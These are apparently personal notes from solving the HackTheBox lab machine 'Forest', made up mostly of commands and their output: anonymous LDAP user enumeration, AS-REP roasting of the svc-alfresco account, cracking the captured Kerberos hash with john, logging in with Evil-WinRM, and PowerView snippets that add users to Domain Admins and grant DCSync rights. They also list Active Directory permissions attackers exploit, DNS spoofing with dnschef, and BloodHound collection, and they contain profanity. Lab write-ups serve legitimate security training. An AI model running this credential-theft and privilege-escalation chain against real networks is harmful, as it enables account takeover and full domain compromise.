


## Finding users

```
kali@kali ~/windapsearch (master)> ./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.161
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None
[+] Enumerating all AD users
[+]	Found 28 users: 
cn: Guest

cn: DefaultAccount

cn: Exchange Online-ApplicationAccount
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local

cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local

cn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local

cn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local

cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local

cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local

cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local

cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local

cn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local

cn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local

cn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local

cn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local

cn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local

cn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local

cn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local

cn: HealthMailbox6ded67848a234577a1756e072081d01f
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local

cn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local

cn: HealthMailboxfd87238e536e49e08738480d300e3772
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local

cn: HealthMailboxb01ac647a64648d2a5fa21df27058a24
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local

cn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local

cn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local

cn: Sebastien Caron
userPrincipalName: sebastien@htb.local

cn: Lucinda Berger
userPrincipalName: lucinda@htb.local

cn: Andy Hislip
userPrincipalName: andy@htb.local

cn: Mark Brandt
userPrincipalName: mark@htb.local

cn: Santi Rodriguez
userPrincipalName: santi@htb.local


[*] Bye!

```


## looking for accounts ig:
```
kali@kali ~> impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-10-26 18:32:23.241448  2019-09-23 07:09:47.931194  0x410200 

```


### Sending request to get hash
```
kali@kali ~> impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -request
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-10-26 18:33:54.048111  2019-09-23 07:09:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:e3ec409e2c2d795d6ad9bfbf778d0b54$277c17b80be36ea44ed004891408c77aee65c865da10b0a6fee89dabeb58b1d7791908f9af37d88c29f55b3d48e3cff0a5cda05839158ba15a2af8840c0b1ea51bd806279b6199dea926bed98482416eed4cc80e9c7bdbd2f9850d3c6d7bcfb3063bb2d3a1482b3aaf905e561205f36792ae4e27fa8e9b53253960eeb7cb7ed3dfde7154c0b66fc0d90377440b3b67615d2b78fdc579bcd6838e8c4f16353dab4ee23c551b693c7214c36c8da13d423475fba80e4f3e5eb97659c638b807d2fdef7b7c6edffa6c11cd3c4078ca99a86fbf93c6d599306685ec9e3399034f750d12c2cc686137

```

## Cracking his hash
```
kali@kali ~> john pass --fork=4 -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     

```



```
kali@kali ~> evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
3cece76e3583c4609675e485798db07f
```



```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword) Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
```


--------------

attempts so far

enumeration 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat

https://burmat.gitbook.io/security/hacking/domain-exploitation


use this 
https://youtu.be/T0IcN4AKDkI

-----

# Useful resources while doing shit

Some of the Active Directory object permissions and types that we as attackers are interested in:

- **GenericAll** - full rights to the object (add users to a group or reset user's password)
- **GenericWrite** - update object's attributes (i.e logon script)
- **WriteOwner** - change object owner to attacker controlled user take over the object
- **WriteDACL** - modify object's ACEs and give attacker full control right over the object
- **AllExtendedRights** - ability to add user to a group or reset password
- **ForceChangePassword** - ability to change user's password
- **Self (Self-Membership)** - ability to add yourself to a group






# FUCK DNS, FUCK THIS BOX, FUCK YOUR MOM 

Dns stuff

remember to do this if dns is not enabled on the box

```
kali@kali ~> dnschef --fakeip 10.10.10.161 --fakedomains forest.htb.local -q -t
(16:50:11) [*] DNSChef started on interface: 127.0.0.1
(16:50:11) [*] Using the following nameservers: 8.8.8.8
(16:50:11) [*] Cooking A replies to point to 10.10.10.161 matching: forest.htb.local
(16:50:11) [*] DNSChef is running in TCP mode
(16:50:30) [*] 127.0.0.1: proxying the response of type 'SRV' for _ldap._tcp.pdc._msdcs.htb.local
(16:50:30) [*] 127.0.0.1: proxying the response of type 'SRV' for _ldap._tcp.pdc._msdcs.htb.local.localdomain
(16:50:30) [*] 127.0.0.1: proxying the response of type 'SRV' for _ldap._tcp.gc._msdcs.htb.local
(16:50:31) [*] 127.0.0.1: proxying the response of type 'SRV' for _ldap._tcp.gc._msdcs.htb.local.localdomain
(16:50:31) [*] 127.0.0.1: proxying the response of type 'SRV' for _kerberos._tcp.dc._msdcs.htb.local
(16:50:31) [*] 127.0.0.1: proxying the response of type 'SRV' for _kerberos._tcp.dc._msdcs.htb.local.localdomain
(16:50:32) [*] 127.0.0.1: cooking the response of type 'A' for forest.htb.local to 10.10.10.161
(16:50:51) [*] 127.0.0.1: cooking the response of type 'A' for forest.htb.local to 10.10.10.161
(16:51:17) [*] 127.0.0.1: proxying the response of type 'A' for EXCH01.htb.local
(16:51:17) [*] 127.0.0.1: cooking the response of type 'A' for FOREST.htb.local to 10.10.10.161
(16:51:17) [*] 127.0.0.1: proxying the response of type 'A' for EXCH01.htb.local.localdomain
(16:55:15) [*] 127.0.0.1: proxying the response of type 'SRV' for _ldap._tcp.gc._msdcs.htb.local.localdomain
```


```
kali@kali ~> bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns 127.0.0.1 -dc forest.htb.local -c All --dns-tcp
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: forest.htb.local
INFO: Kerberos auth to LDAP failed, trying NTLM

```